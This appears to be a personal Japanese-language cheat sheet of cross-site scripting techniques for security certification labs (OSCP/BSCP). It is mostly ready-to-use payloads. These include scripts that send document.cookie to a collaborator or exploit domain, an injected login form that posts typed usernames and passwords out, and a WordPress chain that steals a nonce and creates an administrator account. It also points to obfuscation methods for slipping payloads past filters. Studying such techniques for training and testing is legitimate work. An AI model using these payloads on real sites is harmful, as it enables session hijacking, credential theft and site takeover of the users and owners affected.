
🔗[XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

##### Cookie窃取用スクリプト基本形

```
alert(1)
```
	↓
```
document.location='https://COLLABORATOR_DOMAIN?c='+document.cookie;
```
	or
```
fetch('https://COLLABORATOR_DOMAIN?c='+document.cookie)
```
	or
```
eval(atob("base64エンコードした上記2つのペイロード"))
```
[Web攻撃の難読化](../../../OSCP/Cheatsheet/Evasion(OSCP+試験範囲外)/Web攻撃の難読化.md#base64%20encoding)

---
### 基本形

オンライン上の簡潔なcheatsheetと日本人のcheatsheet見つつ...

###### HTMLへのXSS : Tag is not allowed || Event is not allowed

- [XSS contexts](../../../OSCP/Cheatsheet/Web%20App/XSS%20contexts.md#HTMLタグ内でのXSS)のHTMLタグ内のXSSメソドロジーかも

###### インプットがHTMLエンコードされる

[XSS contexts](../../../OSCP/Cheatsheet/Web%20App/XSS%20contexts.md#引用符がエスケープされるケース)

###### JavaScript内部へのXSS

- [XSS contexts](../../../OSCP/Cheatsheet/Web%20App/XSS%20contexts.md#JavaScriptへのXSS)

###### Stay-logged-in Cookieを取得

1. Comment機能の特定パラメタに以下のスクリプトを注入
```js
<script>
	document.location='https://EXPLOIT_DOMAIN/c='+document.cookie
</script>
```

2. エクスプロイトサーバのAccess logを確認し、Cookieを入手する
3. [⚡️Authentication](../../../BSCP/Server-side/Authentication/⚡️Authentication.md#Stay-logged-inから入る場合)へ

---

### Privilege Escalation w/XSS & CSRF

(cookieを窃取して実行する方法はBSCPノートを閲覧)

- 目的：高権限のユーザーを作成

- 攻撃のシチュエーション：
	- CookieにHTTP onlyフラグが付与されていて、JavaScriptでは窃取できないとき
	- CMSでアカウント作成等のHTTPリクエストを使用した処理が実行され、nonceが使われているとき

- 参考：🔗[How to craft an XSS payload to create an admin user in WordPress](https://shift8web.ca/craft-xss-payload-create-admin-user-in-wordpress-user/)

#### 手順

1. ソースコードもしくはFuzzingでXSSに脆弱なHTTPヘッダーなどを洗い出す（BSCPノートを参照）
	（今回はVisitorsプラグインの`user-agent`が脆弱であるとする）

2. HTTPリクエストを使用した処理（ユーザー作成等）のリクエストをBurpでキャプチャしておく

3. nonceの値を抽出し、そのnonceを使ってユーザーを作成するスクリプトを作成（コメントは削除して使用）

nonce抽出
```js
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```
- 3行目にアクション実行先のHTTPリクエスト
- 4行目第三引数をfalseとすることで、同期通信になる。nonceを確実に抽出する目的

抽出したnonceを使用してアクションを実行するリクエストを作成する
```js
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```
- 1行目に、アクションのHTTP POSTリクエストのパラメタ、かつ、必須の値を指定している

4. [Web攻撃の難読化](../Evasion(OSCP+試験範囲外)/Web攻撃の難読化.md)のJS: CharCodeAt()に従い難読化する。

5. 難読化したスクリプトをBurpSuiteを用いてXSSに脆弱な箇所に埋め込み、ルートディレクトリへGETリクエストをSend（`<script></script>`で囲む）

![](../../Images/Pasted%20image%2020250321200240.png)

6. ステップ1に記載の通り、Visitorsプラグインを閲覧し、user-agentが何も記載されていないことを確認できれば成功

![](../../Images/Pasted%20image%2020250320123601.png)

![](../../Images/Pasted%20image%2020250320123617.png)

---

### OAST

###### username & passwordを取得

1. Comment機能の特定パラメタに以下のスクリプトを注入
```http
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://COLLABORATOR_DOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
2. Request to collaboratorを確認

##### Cookieを取得する

###### Comment機能の場合

1. Comment機能の特定パラメタに以下のスクリプトを注入
```http
<script>
fetch('https://COLLABORATOR_DOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```
2. Request to collaboratorを確認

###### Cookieがusername:tokenの場合

1. `username`の箇所にスクリプトを注入
```
'"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:YOUR-SESSION-ID
```
- `encodeURIComponent()`: URLの一部としてcookieを送るときに使用
2. Request to collaboratorを確認

---
## Misc

###### Reflected XSS基本payload

1. no user interaction in HTML
```html
<iframe src="https://TARGET_NET?[vuln_param]=[payload]">
```
![[Pasted image 20240218101126.png | 50]]↓

2. need user interaction(iframeは禁止されているからこれでうまくいくことが多い)
```html
<script>
location = 'https://TARGET_NET?[vuln_param]=[payload]'
</script>
```

###### Stored XSS基本payload
```js
<script>alert(1)</script>
```

```html
<img src=1 onerror=alert(1)>
```
